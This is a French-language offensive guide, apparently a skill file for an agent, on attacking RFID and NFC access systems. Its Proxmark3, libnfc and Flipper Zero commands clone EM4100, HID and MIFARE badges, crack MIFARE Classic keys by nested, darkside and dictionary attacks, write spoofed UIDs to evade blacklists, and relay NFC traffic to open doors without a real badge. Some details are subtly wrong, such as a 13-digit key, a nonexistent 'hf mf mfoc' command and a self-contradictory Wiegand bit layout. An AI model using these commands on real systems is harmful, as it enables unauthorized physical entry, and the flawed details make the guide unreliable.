---
name: iot-rfid-nfc
title: "RFID & NFC — Clonage, Émulation et Attaques"
description: "Guide complet pour le hacking de systèmes RFID et NFC : clonage de badges (MIFARE Classic, HID, iCLASS), émulation, attaques cryptographiques (crypto1), bruteforce de clés, sniffing de transactions, et exploitation de protocoles de proximité sur les dispositifs IoT."
category: cybersecurite
---

# RFID & NFC — Clonage, Émulation et Attaques

## Vue d'Ensemble

Les technologies RFID (Radio Frequency Identification) et NFC (Near Field Communication) sont omniprésentes dans l'IoT : contrôle d'accès (badges, serrures), paiement sans contact, inventaire, identification d'appareils, authentification sans fil. La capacité à cloner, émuler, ou contourner ces systèmes est un vecteur d'attaque critique.

### Objectifs
- Identifier le type de tag RFID/NFC (fréquence, protocole, crypto)
- Lire et écrire des badges (MIFARE, HID, iCLASS, EM4102)
- Cloner un badge légitime
- Émuler un tag avec un appareil programmable (Flipper Zero, Proxmark3)
- Attaquer la crypto MIFARE Classic (crypto1)
- Bruteforcer des clés d'accès
- Sniffer les échanges entre lecteur et tag
- Contourner l'authentification NFC (relay attack, MITM)

---

## Types de Tags RFID/NFC

### Fréquences
| Bande | Fréquence | Portée | Usage |
|-------|-----------|--------|-------|
| **LF (Low Frequency)** | 125-134 kHz | ~10cm | Contrôle d'accès, animal ID |
| **HF (High Frequency)** | 13.56 MHz | ~5cm | Paiement, transport, MIFARE |
| **UHF (Ultra HF)** | 860-960 MHz | ~10m | Inventaire, logistique |

### Standards LF (125 kHz)
| Type | Crypto | Cloneable | Usage |
|------|--------|-----------|-------|
| **EM4100 / EM4102** | Non | Oui (sans effort) | Badges basiques, club, parking |
| **HID Prox (26-bit)** | Wiegand encoding | Oui | Contrôle d'accès entreprises |
| **Indala** | Propriétaire | Partiellement | Anciens systèmes |
| **AWID** | Encodage | Oui | Systèmes legacy |

### Standards HF (13.56 MHz)
| Type | Crypto | Cloneable | Notes |
|------|--------|-----------|-------|
| **MIFARE Classic (1K/4K)** | Crypto-1 (cassé) | Oui | Badges transport, campus |
| **MIFARE Plus** | AES-128 | Non (sauf vuln) | Successeur Classic |
| **MIFARE DESFire (EV1/EV2/EV3)** | 3DES/AES | Non (clé nécessaire) | Paiement, transport haut de gamme |
| **NTAG (213/215/216)** | Non | Oui | Tags NFC, produits, cartes de visite |
| **MIFARE Ultralight** | Non (UL) / 3DES (EV1) | Oui (UL) | Tickets transport jetables |
| **FeliCa** | DES/MAC | Non | Transport (Japon, HK), Sony |
| **ISO 15693 (I-Code)** | Non | Oui | Bibliothèque, inventaire |

### Standards UHF (860-960 MHz)
| Type | Crypto | Cloneable | Usage |
|------|--------|-----------|-------|
| **EPC Gen2** | Non (optionnel) | Oui | Commerce, logistique |
| **Impinj Monza** | Non | Oui | Retail, supply chain |

---

## Outils Essentiels

### Hardware
| Outil | Fréquences | Prix | Capacités |
|-------|------------|------|-----------|
| **Proxmark3 RDV4** | LF + HF | ~$350 | Lecteur/émuleur complet, sniffing, brute-force |
| **Flipper Zero** | LF + HF | ~$200 | Portable, menu, multi-protocole |
| **ChameleonUltra** | HF | ~$80 | Émulateur multi-MIFARE, scripts Python |
| **ACR122U** | HF (NFC) | ~$30 | Lecteur/écrivain PCSC basique |
| **PN532 (Adafruit)** | HF | ~$25 | NFC shield, Arduino/Raspberry Pi |
| **RC522** | HF | ~$5 | Lecteur MIFARE basique |
| **RDM6300** | LF | ~$10 | Lecteur 125kHz |
| **USRP / HackRF** | LF+HF+UHF | ~$350+ | SDR + RFID (plus complexe) |
| **Magic Tag (UID writeable)** | HF | ~$10/tag | Tags contrefaits, UID modifiable |

### Logiciels
| Outil | Usage |
|-------|-------|
| **mfoc** | Attaque crypto1 MIFARE Classic (nested attack) |
| **mfcuk** | Attaque par dictionnaire de clés MIFARE |
| **libnfc** | Bibliothèque NFC, CLI avec ACR122U/PN532 |
| **proxmark3 client** | Client pour Proxmark3 (iceman fork) |
| **nfc-mfclassic** | Lecture/écriture MIFARE (libnfc) |
| **nfc-list** | Détection de tags |
| **mfkey32** / **mfkey64** | Calcul de clés MIFARE à partir de nonces |
| **crapto1** | Attaque crypto1 (GitHub : iceman1001) |
| **pm3** (Iceman fork) | Firmware + outils Proxmark3 amélioré |

---

## Méthodologie

### Phase 1 : Identification du Tag

```bash
# Avec Proxmark3 :
proxmark3> hw search   # Détection automatique
proxmark3> lf search   # Tags LF (125 kHz)
proxmark3> hf search   # Tags HF (13.56 MHz)

# Avec libnfc (ACR122U/PN532) :
nfc-list

# Avec Flipper Zero :
# Menu → RFID (125 kHz) → Read
# Menu → NFC (13.56 MHz) → Read

# Type de retour :
# - SAK (Select Acknowledge) : type MIFARE (08=1K, 18=4K, 20=Ultralight)
# - ATQA (Answer To Request) : UID size, protocol
# - UID : 4, 7, ou 10 bytes
```

### Phase 2 : Clonage d'un Tag Non Crypté

#### EM4100 (125 kHz) — Clonage Simple
```bash
# 1. Lire le tag avec Proxmark3
proxmark3> lf em 410x read
# Sortie : EM4100 ID: 0x1234567890

# 2. Cloner sur un tag vierge (T5577)
proxmark3> lf em 410x write 0x1234567890

# 3. Vérifier
proxmark3> lf search
```

#### MIFARE Ultralight / NTAG — Pas de Crypto
```bash
# 1. Dump complet
nfc-mfclassic r a dump.mfd    # Avec ACR122U
# Ou
proxmark3> hf mf dump

# 2. Écrire sur tag vierge
nfc-mfclassic w a dump.mfd

# 3. Vérifier la lecture
nfc-list
```

### Phase 3 : Attaque MIFARE Classic (Crypto-1)

```bash
# MIFARE Classic utilise Crypto-1 (cassé en 2008)
# L'attaque nested exploite la faiblesse du PRNG

# 1. Détection de la carte
proxmark3> hf search

# 2. Attaque avec mfoc (HardNested)
proxmark3> hf mf mfoc -o dump.mfd
# Cette commande :
# - Détecte les secteurs accessibles (connaît les clés par défaut)
# - Utilise le Nonce du lecteur pour craquer les clés des autres secteurs
# - Les clés par défaut (transport keys) :
#   FF FF FF FF FF FF
#   A0 A1 A2 A3 A4 A5
#   B0 B1 B2 B3 B4 B5

# 3. Alternative : attaque par dictionnaire
mfoc -O dump.mfd -k FFFFFFFFFFFFF
# Avec un fichier de clés :
mfoc -O dump.mfd -k keys.dic

# 4. Si clés inconnues, attaque DarkSide
proxmark3> hf mf darkside
# Exploite la vulnérabilité du PRNG pour trouver une clé

# 5. Calcul des clés
# Une fois un nonce/nonce récupéré
mfkey32 0xAABBCCDD 0x12345678 0x87654321
```

### Phase 4 : Émulation de Tag

```bash
# Avec Proxmark3 — Émulation LF
proxmark3> lf em 410x sim --id 0x1234567890

# Avec Proxmark3 — Émulation MIFARE
proxmark3> hf mf sim -f dump.mfd

# Avec Flipper Zero
# 1. Lire le tag → Save
# 2. Menu → NFC → Emulate → Select saved tag

# Avec ChameleonUltra
# 1. Charger le dump .mfd sur la carte via USB
# 2. Sélectionner le slot
# 3. Mettre en mode "Emulate"
```

### Phase 5 : Attack par Relais (NFC Relay)

```bash
# Principe : relayer la communication entre un lecteur légitime
# et un tag distant (sans clonage, sans clé)

# Outils : NFCProxy, NFCGate
git clone https://github.com/nfcgate/nfcgate

# 1. Installer l'app sur deux smartphones Android
#    (ou utiliser Proxmark3 + Android)

# 2. Appareil A (près du lecteur) : relaie les commandes
# 3. Appareil B (près du tag) : relaie les réponses
# 4. Le lecteur voit le tag, le tag voit le lecteur
# → Ouverture de porte sans clé réelle

# Alternative avec Proxmark3 :
# Sniffer la communication → rejouer les trames
proxmark3> hf mf sniff
```

---

## Techniques Avancées

### Magic Tags (UID Écriture)
```bash
# Certains tags chinois (Magic Tags) permettent de réécrire
# l'UID, ce que les MIFARE légitimes ne permettent pas
# Utile pour :
# - Cloner des tags qui vérifient l'UID (shadow clone)
# - Contourner les listes noires de tags

# Avec Proxmark3 :
proxmark3> hf mf csetuid --uid 0x12345678

# Vérification :
proxmark3> hf mf reader
# L'UID doit être 0x12345678
```

### Attaque sur HID Prox (26-bit)
```bash
# Les badges HID 26-bit utilisent un format Wiegand simple :
# - Bit 0 : parity even (bits 1-12)
# - Bits 1-8 : Facility Code
# - Bits 9-25 : Card Number
# - Bit 25 : parity odd (bits 9-24)

# Clonage :
# 1. Lire avec Proxmark3
proxmark3> lf hid fskdemod

# 2. Calculer le format Wiegand
# Facility Code = bits 1-8
# Card Number = bits 9-24

# 3. Cloner sur T5577
proxmark3> lf hid clone --fc 123 --cn 45678

# Attaque "deface" : HID Corporate 1000 est similaire
# mais supporte plus de bits
```

### Reverse de Crypto Propriétaire
```bash
# Pour les protocoles non documentés (MiFare Plus, DESFire) :
# 1. Sniffer la communication complète
#    Proxmark3 en mode sniffer passif
proxmark3> hf sniff

# 2. Capturer l'authentification complète
#    (lecteur → tag, tag → lecteur)

# 3. Analyser hors-ligne
#    - Nonces échangés
#    - Longueur des réponses AES
#    - Patterns (CBC, ECB, CMAC)

# 4. Si un tag avec une clé connue est disponible
#    → reverse du protocole complet
```

### Bruteforce de Clés MIFARE
```bash
# Utiliser un dictionnaire de clés connues
# Base de données : https://github.com/iceman1001/proxmark3/tree/master/client/dictionaries

# Dictionnaire standard (96 clés par défaut)
# Dictionnaire étendu (milliers de clés de production)

# Attaque avec Proxmark3 :
proxmark3> hf mf chk *1 ? t dictionaries/nstd.keys

# Ou script Python automatisé
# Bruteforce des 65536 clés possibles (certains secteurs)
```

---

## Pièges & ASTUCES

⚠️ **MIFARE Classic est mort** : crypto-1 cassé, mais encore massivement utilisé. Ne pas s'étonner si ça marche
⚠️ **UID non modifiable** : la plupart des tags ont un UID verrouillé en usine. Les Magic Tags sont les seuls à permettre l'écriture d'UID
⚠️ **Distance de lecture** : NFC < 5cm, LF ~10cm, UHF ~10m. Ne pas s'attendre à lire un badge à distance avec un smartphone
⚠️ **Proxmark3 iceman fork** : le fork iceman1001 est bien supérieur à l'original. Utiliser celui-ci
⚠️ **ACR122U limité** : ne supporte pas tous les modes de MIFARE Classic (il manque parfois le hardware crypto)
⚠️ **Contrefaçon de lecteurs** : les ACR122U chinois peuvent avoir des bugs (UID tronqué, SAK erroné)
⚠️ **Batterie de tag** : les tags passifs (la plupart) n'ont pas de batterie. Ils sont alimentés par le champ du lecteur. Un tag émulé doit générer ce champ
⚠️ **Anti-clonage avancé** : les systèmes modernes (DESFire EV3) utilisent des protocoles à clé partagée et des certificats. Le clonage physique ne suffit pas

### Check-list Rapide
```bash
# 1. Identifier le type de tag
#    (Proxmark3/Flipper → hw search)

# 2. Si LF (125kHz) : clonage direct
# 3. Si HF (13.56MHz) :
#    - Ultralight/NTAG → dump direct
#    - MIFARE Classic → attaque nested (mfoc)
#    - DESFire/Plus → nécessite clés

# 4. Émuler / écrire sur tag vierge
# 5. Tester sur le lecteur cible
```

---

## Références

- **Proxmark3 Iceman Fork** : https://github.com/RfidResearchGroup/proxmark3
- **Flipper Zero Docs** : https://docs.flipperzero.one/
- **ChameleonUltra** : https://github.com/RfidResearchGroup/ChameleonUltra
- **libnfc** : https://github.com/nfc-tools/libnfc
- **mfoc / HardNested** : https://github.com/nfc-tools/mfoc
- **Crapto1** : https://github.com/iceman1001/crapto1
- **NFCGate** : https://github.com/nfcgate/nfcgate
- **MIFARE Classic Security** : https://eprint.iacr.org/2008/343.pdf (Nohl et al.)
- **RFID Hacking (YouTube)** : LiveOverflow, Samy Kamkar, Hacker Warehouse